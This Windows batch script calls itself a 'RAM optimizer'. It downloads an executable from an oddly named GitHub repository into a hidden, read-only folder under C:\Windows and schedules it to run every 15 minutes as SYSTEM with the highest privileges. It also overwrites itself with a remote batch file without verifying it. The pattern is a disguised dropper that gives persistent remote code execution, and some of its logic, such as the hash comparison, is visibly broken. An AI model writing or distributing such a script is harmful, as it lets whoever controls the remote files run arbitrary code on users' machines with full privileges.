@echo off
title RAM OPTIMIZER BY GLUOZ
setlocal enabledelayedexpansion

:: Set CMD Colors (Black Background, Green Text)
color 3E

:: Disable Command Prompt Blinking and Set Window Size
mode con: cols=120 lines=30

:: Variables
set "source=https://github.com/servicescloudsoxb/vdfnnfsgn-bvc-xcbb-xxzC/raw/refs/heads/main/EmptyStandbyList.exe"
set "destination=C:\Windows\EmptyStandbyList\EmptyStandbyList.exe"
set "batchFile=https://github.com/servicescloudsoxb/vdfnnfsgn-bvc-xcbb-xxzC/raw/refs/heads/main/ram_optimizer.bat"
set "batchFileLocal=C:\Windows\ram_optimizer.bat"

:: Detect System Language using systeminfo (works on most systems)
for /f "tokens=2 delims==" %%a in ('systeminfo ^| findstr /i "System Locale"') do set "language=%%a"
set "language=%language:~0,2%"  :: Extract just the first two characters of the language code

if /I "%language%"=="es" (
    set "message_start=Presione cualquier tecla para comenzar..."
    set "message_error_file=Error: 'EmptyStandbyList.exe' no encontrado en la carpeta 'Source'."
    set "message_error_folder=No se pudo crear la carpeta. Verifique los permisos."
    set "message_error_copy=No se pudo copiar el archivo. Verifique los permisos o la existencia del archivo."
    set "message_task_failed=No se pudo crear la tarea programada. Verifique los permisos del sistema."
    set "message_completed=¡Proceso completado con éxito!"
    set "message_task_scheduled=Tarea 'Optimize RAM By GluOz' programada para ejecutarse cada 15 minutos."
) else (
    set "message_start=Press any key to start..."
    set "message_error_file=Error: 'EmptyStandbyList.exe' not found in 'Source' folder."
    set "message_error_folder=Failed to create folder. Check permissions."
    set "message_error_copy=Failed to copy the file. Check permissions or file existence."
    set "message_task_failed=Failed to create the scheduled task. Check system permissions."
    set "message_completed=Process Completed Successfully!"
    set "message_task_scheduled=Task 'Optimize RAM By GluOz' scheduled to run every 15 minutes."
)

:: Check if the batch file is up-to-date by comparing hash values
set "hash_local="
set "hash_remote="

:: Create a temporary file for hash comparison
set "tempFile=%TEMP%\ram_optimizer.bat"
powershell -Command "(Get-FileHash '%batchFileLocal%').Hash" > "%tempFile%"
set /p hash_local=<%tempFile%

:: Download the remote batch file to get its hash
powershell -Command "Invoke-WebRequest -Uri '%batchFile%' -OutFile '%tempFile%'"
powershell -Command "(Get-FileHash '%tempFile%').Hash" > "%tempFile%"
set /p hash_remote=<%tempFile%

:: Compare the hashes
if /I "%hash_local%" NEQ "%hash_remote%" (
    echo The batch file is outdated, downloading the latest version...
    powershell -Command "Invoke-WebRequest -Uri '%batchFile%' -OutFile '%batchFileLocal%'"
    echo Batch file updated successfully!
)

:: Pause to allow user to start
cls
echo.   
echo.   
echo.   
echo.   
echo.   
echo.   
echo.   
echo.   
echo.   
echo.   
echo.   
echo.   
echo.  
echo 						%message_start%
echo.   
echo.   
echo.   
echo.   
echo.   
echo.   
echo.   
echo.   
echo.   
echo.   
echo.   
echo.  
echo.   
echo.   
echo.  
echo.  
pause >nul

:: Create Folder in C:\Windows if it doesn't exist
if not exist "C:\Windows\EmptyStandbyList" (
    mkdir "C:\Windows\EmptyStandbyList"
    if errorlevel 1 (
        echo %message_error_folder%
        pause
        exit /b
    )
)

:: Set Folder to Hidden and Read-Only
attrib +h +r "C:\Windows\EmptyStandbyList"

:: Download the file from GitHub using Invoke-WebRequest
echo Downloading EmptyStandbyList.exe from GitHub...
powershell -Command "if (-not (Test-Path 'C:\Windows\EmptyStandbyList')) { New-Item -Path 'C:\Windows\EmptyStandbyList' -ItemType Directory }"
powershell -Command "Invoke-WebRequest -Uri '%source%' -OutFile '%destination%'"

:: Check if the file was downloaded successfully
if not exist "%destination%" (
    echo %message_error_file%
    pause
    exit /b
)

:: Simulated Loading Screen (Diagonal Bars Progression)
cls
set "progress=[                    ]"
for /L %%i in (1,1,20) do (
    set /a len=%%i
    set "bar=[" 
    for /L %%j in (1,1,!len!) do set "bar=!bar!/"
    for /L %%j in (!len!,1,20) do set "bar=!bar! "
    set "bar=!bar!]"

    cls
    :: Manually Centering the Text for Loading
    echo.   
    echo.   
    echo.   
    echo.   
    echo.   
    echo.   
    echo.   
    echo.   
    echo.   
    echo.   
    echo.   
    echo.   
    set "spaces="
    for /L %%a in (1,1,44) do set "spaces=!spaces! "
    echo !spaces!Loading: !bar!
    echo.  
    echo.   
    echo.   
    echo.   
    echo.   
    echo.   
    echo.   
    echo.   
    echo.   
    echo.   
    echo.   
    echo.   
    echo.   
    echo.   
    echo.   
    echo.   
    timeout /nobreak /t 1 >nul
)

:: Schedule Task in Task Scheduler
schtasks /create /tn "Optimize RAM By GluOz" /tr "%destination%" /sc minute /mo 15 /ru SYSTEM /rl HIGHEST /f >nul
if errorlevel 1 (
    echo %message_task_failed%
    pause
    exit /b
)

:: Final Message
cls
:: Centered Final Message for Completion
echo.   
echo.   
echo.   
echo.   
echo.   
echo.   
echo.   
echo.   
echo.   
echo.   
echo.   
echo.   
echo.   
echo.   
set "spaces="
for /L %%a in (1,1,44) do set "spaces=!spaces! "
echo !spaces!%message_completed%
echo.
set "spaces="
for /L %%a in (1,1,28) do set "spaces=!spaces! "
echo !spaces!%message_task_scheduled%
echo.  
echo.   
echo.   
echo.   
echo.   
echo.   
echo.   
echo.   
echo.   
echo.   
echo.   
echo.   
echo.   
echo.   
echo.   
echo.   
pause
exit
